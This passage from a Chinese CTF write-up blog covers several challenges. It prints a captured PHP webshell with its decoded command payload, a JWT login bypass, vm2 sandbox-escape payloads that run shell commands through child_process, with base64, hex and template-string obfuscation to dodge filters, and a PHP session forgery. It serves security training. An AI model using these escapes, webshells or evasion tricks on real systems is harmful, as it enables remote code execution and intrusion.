src="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200429160848649.png" alt></p><p>然后看文件名猜到可能要蓝牙的PIN码才能得到，然后导出7z，再从流量包字符串搜索找到PIN值</p><p><img src="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200429160741397.png" alt></p><p>解压得到flag</p><h3 id="0x-03-keyboard"><a href="#0x-03-keyboard" class="headerlink" title="0x 03 keyboard"></a>0x 03 keyboard</h3><p>首先是内存取证：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">volatility -f Keyboard.raw imageinfo</span><br><span class="line">volatility -f Keyboard.raw --profile&#x3D;Win7SP1x64 filescan | grep txt</span><br><span class="line">volatility -f Keyboard.raw --profile&#x3D;Win7SP1x64 dumpfiles -Q 0x000000003d700880 -n--dump&#x3D;.&#x2F;</span><br></pre></td></tr></table></figure><p>得到：</p><p><img src="https://uploader.shimo.im/f/yQvpPVRHchkOWLPz.png!thumbnail" alt="img"></p><p>键盘加密：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string1 &#x3D; &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line">string2 &#x3D; &quot;QWERTYUIOPASDFGHJKLZXCVBNM&quot;</span><br><span class="line">str &#x3D; &#39;CTKQEKNHZHQLLVGKROLATNWGQKRRKQGWNTA&#39;</span><br><span class="line">print(str.translate(str.maketrans(string2,string1)))</span><br></pre></td></tr></table></figure><p>得到解密明文<code>VERACRYPTPASSWORDISKEYBOARDDRAOBYEK</code>用了<code>VERACRYPT</code>的工具，密码是<code>KEYBOARDDRAOBYEK</code></p><p>ntfs数据流解密得到flag</p><h4 id="0x-04-awdshell"><a href="#0x-04-awdshell" class="headerlink" title="0x 04 awdshell"></a>0x 04 awdshell</h4><p>先导出http对象得到源文件，发现存在木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd &#x3D; @$_POST[&#39;ant&#39;];</span><br><span class="line">$pk &#x3D; &lt;&lt;&lt;EOF</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmXoXBvXeanxgl51HBm2J6HPNh</span><br><span class="line">TQtfb8ICioE+n0Ni0DlBFHSBprbsWYKJywVfdhJbLDCCon68uA1UYuy0yteDog3j</span><br><span class="line">OdweW2bscEGmeMXLQJfBHpQrg4wWoYJjD3QsKorYT6kdp1LRkuHE3PbpqvRtqO7A</span><br><span class="line">LzrcBi88Eu7oZaPANwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">EOF;</span><br><span class="line">$cmds &#x3D; explode(&quot;|&quot;, $cmd);</span><br><span class="line">$pk &#x3D; openssl_pkey_get_public($pk);</span><br><span class="line">$cmd &#x3D; &#39;&#39;;</span><br><span class="line">foreach ($cmds as $value) &#123;</span><br><span class="line">  if (openssl_public_decrypt(base64_decode($value), $de, $pk)) &#123;</span><br><span class="line">    $cmd .&#x3D; $de;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">eval($cmd);</span><br></pre></td></tr></table></figure><p>写出对应的解码代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str&#x3D;&#39;&#39;;&#x2F;&#x2F;fang mi wen</span><br><span class="line">$pk &#x3D; &#39;-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmXoXBvXeanxgl51HBm2J6HPNh</span><br><span class="line">TQtfb8ICioE+n0Ni0DlBFHSBprbsWYKJywVfdhJbLDCCon68uA1UYuy0yteDog3j</span><br><span class="line">OdweW2bscEGmeMXLQJfBHpQrg4wWoYJjD3QsKorYT6kdp1LRkuHE3PbpqvRtqO7A</span><br><span class="line">LzrcBi88Eu7oZaPANwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----&#39;;</span><br><span class="line">$strs &#x3D; explode(&quot;|&quot;, $str);</span><br><span class="line">$pk &#x3D; openssl_pkey_get_public($pk);</span><br><span class="line">$str &#x3D; &#39;&#39;;</span><br><span class="line">foreach ($strs as $value) &#123;</span><br><span class="line">  if (openssl_public_decrypt(base64_decode($value), $de, $pk)) &#123;</span><br><span class="line">    $str .&#x3D; $de;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $str;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>解码对应的数据包得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">function asenc($out) &#123;</span><br><span class="line">@session_start();</span><br><span class="line">$key&#x3D;@substr(str_pad(session_id(),16,&#39;a&#39;),0,16);</span><br><span class="line">return @base64_encode(openssl_encrypt(base64_encode($out), &#39;AES-128-ECB&#39;, $key, OPENSSL_RAW_DATA));</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line">function asoutput() &#123;</span><br><span class="line">$output&#x3D;ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line">echo &quot;f9d3fc090&quot;;</span><br><span class="line">echo @asenc($output);</span><br><span class="line">echo &quot;4d608782174&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">$D&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">if($D&#x3D;&#x3D;&quot;&quot;)$D&#x3D;dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);</span><br><span class="line">$R&#x3D;&quot;&#123;$D&#125;&quot;;</span><br><span class="line">if(substr($D,0,1)!&#x3D;&quot;&#x2F;&quot;) &#123;</span><br><span class="line">foreach(range(&quot;C&quot;,&quot;Z&quot;)as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.&#x3D;&quot;&#123;$L&#125;:&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$R.&#x3D;&quot;&#x2F;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$R.&#x3D;&quot;&quot;;</span><br><span class="line">$u&#x3D;(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;;</span><br><span class="line">$s&#x3D;($u)?$u[&quot;name&quot;]:@get_current_user();</span><br><span class="line">$R.&#x3D;php_uname();</span><br><span class="line">$R.&#x3D;&quot;&#123;$s&#125;&quot;;</span><br><span class="line">echo $R;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">catch(Exception $e) &#123;</span><br><span class="line">echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br></pre></td></tr></table></figure><p>可以看出返回的密文是一个AES加密后加盐混淆的东西，AES是<code>AES-128-ECB</code>模式，KEY是session的前16位，也就是<code>hm3pq66843bbbrdg</code>可以看报文cookie里的 PHPSESSID获得</p><p><img src="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200429164054689.png" alt></p><p><img src="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200429164254472.png" alt></p><p><img src="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200429164316178.png" alt></p><p>最后一步步解密得到flag</p><p>参考资料：</p><blockquote><p><a href="http://www.fzwjscj.xyz/index.php/archives/25/" target="_blank" rel="noopener">http://www.fzwjscj.xyz/index.php/archives/25/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h3&gt;&lt;h4 id=&quot;0x-01-Ezunserialize&quot;&gt;&lt;a href=&quot;#0x-01-Ezunserialize&quot; class=&quot;he
      
    
    </summary>
    
    
      <category term="ctfwp" scheme="http://yoursite.com/categories/ctfwp/"/>
    
    
      <category term="安恒杯" scheme="http://yoursite.com/tags/%E5%AE%89%E6%81%92%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>虎符网络安全大赛复盘</title>
    <link href="http://yoursite.com/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/"/>
    <id>http://yoursite.com/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/</id>
    <published>2020-04-19T11:19:54.000Z</published>
    <updated>2020-04-28T00:25:34.091Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近状态太低迷，哎，难受的鸭皮</p><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="0x-01-EasyLogin"><a href="#0x-01-EasyLogin" class="headerlink" title="0x 01 EasyLogin"></a>0x 01 EasyLogin</h4><p>1.网站打开是登录页面，查看js文件看到提示</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200419192426603.png" alt></p><ol start="2"><li>尝试文件读取，首选是app.js，发现成功</li></ol><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200419192733287.png" alt="image-20200419192733287"></p><ol start="3"><li>审计代码读取/controllers/api.js文件，成功</li></ol><p>关键代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">    &#39;POST &#x2F;api&#x2F;register&#39;: async (ctx, next) &#x3D;&gt; &#123;</span><br><span class="line">        const &#123;username, password&#125; &#x3D; ctx.request.body;</span><br><span class="line"></span><br><span class="line">        if(!username || username &#x3D;&#x3D;&#x3D; &#39;admin&#39;)&#123;</span><br><span class="line">            throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(global.secrets.length &gt; 100000) &#123;</span><br><span class="line">            global.secrets &#x3D; [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const secret &#x3D; crypto.randomBytes(18).toString(&#39;hex&#39;);</span><br><span class="line">        const secretid &#x3D; global.secrets.length;</span><br><span class="line">        global.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        const token &#x3D; jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#39;HS256&#39;&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &#39;POST &#x2F;api&#x2F;login&#39;: async (ctx, next) &#x3D;&gt; &#123;</span><br><span class="line">        const &#123;username, password&#125; &#x3D; ctx.request.body;</span><br><span class="line"></span><br><span class="line">        if(!username || !password) &#123;</span><br><span class="line">            throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const token &#x3D; ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        const sid &#x3D; JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;</span><br><span class="line"></span><br><span class="line">        console.log(sid)</span><br><span class="line"></span><br><span class="line">        if(sid &#x3D;&#x3D;&#x3D; undefined || sid &#x3D;&#x3D;&#x3D; null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;&#x3D; 0)) &#123;</span><br><span class="line">            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const secret &#x3D; global.secrets[sid];</span><br><span class="line"></span><br><span class="line">        const user &#x3D; jwt.verify(token, secret, &#123;algorithm: &#39;HS256&#39;&#125;);</span><br><span class="line"></span><br><span class="line">        const status &#x3D; username &#x3D;&#x3D;&#x3D; user.username &amp;&amp; password &#x3D;&#x3D;&#x3D; user.password;</span><br><span class="line"></span><br><span class="line">        if(status) &#123;</span><br><span class="line">            ctx.session.username &#x3D; username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>大致是注册的时候生成一个secret，添加到全局数据中，用于加密账号和密码生成jwttoken，登录的时候根据token里面的sid参数获取secret解密判断账号密码是否正确，这里可以采取数组绕过+空加密登录。payload如下</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200419193156231.png" alt="image-20200419193156231"></p><p>注册一个用户获取session，登录抓包修改token登录</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200419193351610.png" alt="image-20200419193351610"></p><p>然后访问/api/flag得到flag</p><p>本题来源于ev0a师傅的unctf出题，当时没做。。。<a href="https://evoa.me/index.php/archives/60/" target="_blank" rel="noopener">https://evoa.me/index.php/archives/60/</a></p><h3 id="0x-02-JustEscape"><a href="#0x-02-JustEscape" class="headerlink" title="0x 02  JustEscape"></a>0x 02  JustEscape</h3><p>考点是nodejs沙箱逃逸，通过测试语言的产生异常的代码进行fuzz，使得后端抛出异常，发现后端是NodeJS + vm2,payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">var err &#x3D; new Error();</span><br><span class="line">return err.stack;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200420142723612.png" alt>接下来是到vm2 的仓库里查找一下逃逸相关的 issue</p><p>code存在过滤，数组可以绕过</p><p>逃逸的exp可以在<a href="https://github.com/patriksimek/vm2/issues/225获得" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues/225获得</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">        Buffer.from(new Proxy(&#123;&#125;, &#123;</span><br><span class="line">            getOwnPropertyDescriptor()&#123;</span><br><span class="line">                throw f&#x3D;&gt;f.constructor(&quot;return process&quot;)();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;));</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e(()&#x3D;&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现return报错，去掉后执行成功</p><p>过滤的地方可以利用反引号来把文本括起来作为字符串 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings，同时我们也可以利用模板字符串嵌套来拼接出我们想要的被过滤了的字符串" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings，同时我们也可以利用模板字符串嵌套来拼接出我们想要的被过滤了的字符串</a></p><p>比如这里 prototype 被过滤了，我们可以这样书写 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;</span><br></pre></td></tr></table></figure><p>贴一下payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(function ()&#123;</span><br><span class="line">    TypeError[&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;][&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;] &#x3D; f&#x3D;&gt;f[&#96;$&#123;&#96;$&#123;&#96;constructo&#96;&#125;r&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;return this.proces&#96;&#125;s&#96;&#125;&#96;)();</span><br><span class="line">    try&#123;</span><br><span class="line">        Object.preventExtensions(Buffer.from(&#96;&#96;)).a &#x3D; 1;</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e[&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;](()&#x3D;&gt;&#123;&#125;).mainModule[&#96;$&#123;&#96;$&#123;&#96;requir&#96;&#125;e&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;child_proces&#96;&#125;s&#96;&#125;&#96;)[&#96;$&#123;&#96;$&#123;&#96;exe&#96;&#125;cSync&#96;&#125;&#96;](&#96;whoami&#96;).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p>看了chamd5的师傅知道了还可以用字符串拆分和base64编码绕过过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TypeError.prototype.get_process &#x3D; f &#x3D;&gt; f.constructor(&quot;return process&quot;)();</span><br><span class="line">try &#123;</span><br><span class="line">    Object.preventExtensions(Buffer.from(&quot;&quot;)).a &#x3D; 1;</span><br><span class="line">&#125; catch (e) &#123;</span><br><span class="line">    e.get_process(() &#x3D;&gt; &#123; &#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;cat &#x2F;flag&quot;).toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>base64编码绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">global[[&#96;eva&#96;,%20&#96;l&#96;].join(&#96;&#96;)](Buffer.from(&#96;VHlwZUVycm9yLnByb3RvdHlwZS5nZXRfcHJvY2VzcyA9IGYgPT4gZi5jb25zdHJ1Y3RvcigicmV0dXJuIHByb2Nlc3MiKSgpOwp0cnkgewogICAgT2JqZWN0LnByZXZlbnRFeHRlbnNpb25zKEJ1ZmZlci5mcm9tKCIiKSkuYSA9IDE7Cn0gY2F0Y2ggKGUpIHsKICAgIGUuZ2V0X3Byb2Nlc3MoKCkgPT4geyB9KS5tYWluTW9kdWxlLnJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKS5leGVjU3luYygiY2F0IC9mbGFnIikudG9TdHJpbmcoKTsKfQ&#x3D;&#x3D;&#96;,%20&#96;base64&#96;).toString(&#96;ascii&#96;));</span><br></pre></td></tr></table></figure><p>第一种方法的hex编码绕过方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;(function()&#123;TypeError[String.fromCharCode(112,114,111,116,111,116,121,112,101)][&#96;\x67\x65\x74\x5f\x70\x72\x6f\x63\x65\x73\x73&#96;] &#x3D; f&#x3D;&gt;f[&#96;\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72&#96;](&#96;\x72\x65\x74\x75\x72\x6e\x20\x70\x72\x6f\x63\x65\x73\x73&#96;)();try&#123;Object.preventExtensions(Buffer.from(&#96;&#96;)).a &#x3D; 1;&#125;catch(e)&#123;return e[&#96;\x67\x65\x74\x5f\x70\x72\x6f\x63\x65\x73\x73&#96;](()&#x3D;&gt;&#123;&#125;).mainModule.require((&#96;\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73&#96;))[&#96;\x65\x78\x65\x63\x53\x79\x6e\x63&#96;](&#96;cat &#x2F;flag&#96;).toString();&#125;&#125;)()</span><br></pre></td></tr></table></figure><p>第二种方法的hex编码绕过方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(function()%7B%0A%09try%7B%0A%09%09Buffer.from(new%20Proxy(%7B%7D%2C%20%7B%0A%09%09%09getOwnPropertyDescriptor()%7B%0A%09%09%09%09throw%20f%3D%3Ef%5B%60%5Cx63%5Cx6f%5Cx6e%5Cx73%5Cx74%5Cx72%5Cx75%5Cx63%5Cx74%5Cx6f%5Cx72%60%5D(%60%5Cx72%5Cx65%5Cx74%5Cx75%5Cx72%5Cx6e%5Cx20%5Cx70%5Cx72%5Cx6f%5Cx63%5Cx65%5Cx73%5Cx73%60)()%3B%0A%09%09%09%7D%0A%09%09%7D))%3B%0A%09%7Dcatch(e)%7B%0A%09%09return%20e(()%3D%3E%7B%7D).mainModule.require(%60%5Cx63%5Cx68%5Cx69%5Cx6c%5Cx64%5Cx5f%5Cx70%5Cx72%5Cx6f%5Cx63%5Cx65%5Cx73%5Cx73%60)%5B%60%5Cx65%5Cx78%5Cx65%5Cx63%5Cx53%5Cx79%5Cx6e%5Cx63%60%5D(%60cat%20%2Fflag%60).toString()%3B%0A%09%7D%0A%7D()</span><br></pre></td></tr></table></figure><p>贴一下链接：<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247486804&idx=1&sn=2a7cff6961849e562b9d0c93af425976&chksm=e89e258cdfe9ac9abdd7867b19795de6bcb2b508b56f3f608283d77f3ae1d70837060a959769&mpshare=1&scene=23&srcid=&sharer_sharetime=1587452651285&sharer_shareid=7fa312c2aff8bd738bf9d331ff765678#rd" target="_blank" rel="noopener">数字中国创新大赛-虎符网络安全赛道Write up</a></p><h3 id="0x-03-Babyupload"><a href="#0x-03-Babyupload" class="headerlink" title="0x 03 Babyupload"></a>0x 03 Babyupload</h3><p>本题需要伪造session，首先使用download功能查看当前的session</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200420145648294.png" alt></p><p>结果如下：</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200420145727579.png" alt></p><p>发现其 session 处理器为 php_binary，本地生成一下session文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php_binary&#39;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#39;username&#39;] &#x3D; &#39;admin&#39;;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200420152113464.png" alt></p><p>计算文件的sha256 摘要值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo hash_file(&#39;sha256&#39;, &#39;sess&#39;)</span><br></pre></td></tr></table></figure><p>得到<code>432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</code></p><p>接下来是绕过file_exists，文档中的定义是<em>检查文件或目录是否存在</em>，所以我们可以创建一个success.txt目录来绕过</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200420152440813.png" alt></p><p>参考资料：</p><blockquote><p> <a href="https://www.zhaoj.in/read-6512.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6512.html</a></p><p><a href="https://p3rh4ps.top/index.php/2020/04/19/%e8%99%8e%e7%ac%a6ctf-web-wp/" target="_blank" rel="noopener">https://p3rh4ps.top/index.php/2020/04/19/%e8%99%8e%e7%ac%a6ctf-web-wp/</a></p></blockquote><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x-01-奇怪的组织"><a href="#0x-01-奇怪的组织" class="headerlink" title="0x 01 奇怪的组织"></a>0x 01 奇怪的组织</h4><ul><li>题目描述</li></ul><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200421180925473.png" alt></p><ul><li>解题过程</li></ul><blockquote><p>题目附件：<a href="https://pan.baidu.com/s/1LA4MrUUFUGLe49eTuWdLDw" target="_blank" rel="noopener">附件下载</a> 